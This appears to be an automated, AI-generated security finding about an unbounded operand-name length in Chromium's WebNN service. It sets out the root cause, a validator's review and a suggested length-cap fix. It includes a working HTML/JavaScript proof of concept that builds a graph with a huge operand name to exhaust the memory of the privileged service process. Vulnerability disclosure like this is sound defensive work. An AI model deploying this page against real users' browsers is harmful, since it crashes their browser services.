# Security finding #744: SanitizeName (graph_builder_ort.cc:165-170) copies the entire untru…

**Summary:** SanitizeName (graph_builder_ort.cc:165-170) copies the entire untru…

**CWE IDs:** CWE-400: Uncontrolled Resource Consumption (also CWE-789: Memory Allocation with Excessive Size)
**Severity / Impact:** A renderer can supply operand names up to the Mojo message-size limit (tens/hundreds of MB) with no per-name cap. Each such name is duplicated multiple times (SanitizeName copy, JoinString copy, name→onnx-name map entry, ONNX ValueInfo/initializer, and downstream propagation into the ORT/OpenVINO IR), multiplying peak memory in the privileged WebNN service process and enabling a memory-exhaustion DoS of the browser's GPU/WebNN service from untrusted web content.
**Affected location:** `targets/chromium/services/webnn/ort/graph_builder_ort.cc:165` — `SanitizeName / GetOperandName / GetOperandNameById()`
**Validated for repos:** chromiumWebnn
**Trust boundary:** web content (renderer) → Mojo IPC (mojom::Operand.name) → WebNN service process (GraphBuilderOrt / ModelEditor)

## Description / Root cause
SanitizeName (graph_builder_ort.cc:165-170) copies the entire untrusted operand.name into a std::string and only replaces NUL bytes; GetOperandName (172-177) then produces another copy via JoinString. Neither imposes any length cap. The upstream validator in webnn_graph_builder_impl.cc (ValidateGraph loop at 3029-3078) only rejects operand names that are empty or non-unique and checks byte_length of the tensor data — it never bounds the *name string length*. GetOperandNameById (396-399) forwards the full string into ModelEditor::AddInput / AddInitializer at BuildModel (3183/3187), where CreateOrtValueInfo/AddInitializerToGraph copy it again into the in-memory ONNX model.

**Validator analysis:** The vuln type (CWE-400) and impact (memory-exhaustion DoS of the privileged WebNN service process) are accurately stated. The data-flow path is: JS supplies an arbitrarily-long name string → serialized as mojom::Operand.name (no MaxLength constraint) → ValidateGraph at webnn_graph_builder_impl.cc:3039-3067 checks only empty/uniqueness, never size → SanitizeName (graph_builder_ort.cc:165-170) does a full std::string copy → GetOperandName (line 172-177) does a second copy via JoinString → BuildModel (line 3181-3183) stores the result in the ONNX in-memory model. Multiple copies of a name supplied at e.g. 100 MB would exhaust service-process memory. The proposed fix is correct: add `if (name.value().size() > kMaxOperandNameLength) { return std::nullopt; }` alongside the existing empty-check at line 3039/3060, with kMaxOperandNameLength set to e.g. 4096. This single guard at the trust boundary prevents all downstream amplification. A DCHECK in SanitizeName is also a good defense-in-depth measure but is not the primary fix.

## Exploit / Proof of Concept
From JS, build an MLGraph whose input/output operand is given a name string of e.g. 200 MB (repeated characters). buildSync/build serializes it over Mojo as mojom::Operand.name; ValidateGraph passes it (non-empty, unique), then BuildModel calls SanitizeName which allocates a full 200 MB copy, JoinString allocates another, AddInput stores it in the map and the ONNX model — several hundred MB per name, repeated across many named operands, exhausting service-process memory.

## Reproduction (html)
```
<!DOCTYPE html>
<html>
<head><title>WebNN operand name DoS PoC</title></head>
<body>
<script>
// Proof-of-concept: supply a very large operand name to exhaust WebNN service memory.
// WARNING: this will attempt to allocate hundreds of MB in the browser's WebNN service process.
// Use a small size first (e.g. 1000) to verify the path; scale up to trigger OOM.
async function run() {
  const NAME_SIZE = 1 * 1024 * 1024; // 1 MB — scale up to 100+ MB to trigger DoS
  const bigName = 'A'.repeat(NAME_SIZE);

  try {
    const ctx = await navigator.ml.createContext({ deviceType: 'gpu' });
    const builder = new MLGraphBuilder(ctx);

    // Create a trivial graph whose input operand has a huge name.
    const inputDesc = { dataType: 'float32', shape: [1] };
    const inputOperand = builder.input(bigName, inputDesc);
    // Add a minimal op (identity via relu) to make the graph valid.
    const output = builder.relu(inputOperand);

    // Build the graph — this triggers serialization of bigName over Mojo IPC
    // and the subsequent SanitizeName / GetOperandName copies in the service.
    const graph = await builder.build({ [bigName + '_out']: output });
    document.body.textContent = 'Graph built (service survived at this size).';
  } catch (e) {
    document.body.textContent = 'Error: ' + e;
  }
}
run();
</script>
</body>
</html>
```

## Test
_(not provided)_


## Suggested fix
Add a length cap on operand names at the trust boundary: in webnn_graph_builder_impl.cc's ValidateGraph, reject operands whose name.value().size() exceeds a small constant (e.g. a few KB, matching realistic identifier lengths) with `return std::nullopt;`, alongside the existing empty/uniqueness checks at lines 3039-3067. Optionally also guard SanitizeName in graph_builder_ort.cc with a DCHECK/early bound. This caps allocation before the string is copied into the ONNX model editor.

## Models used

| Role | Provider / model |
| --- | --- |
| Idea | `claude-4-6-sonnet` |
| Tech lead | `claude-4-6-sonnet` |
| Researcher | `claude-4-8-opus` |
| Validator | `claude-4-6-sonnet` |


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #744.
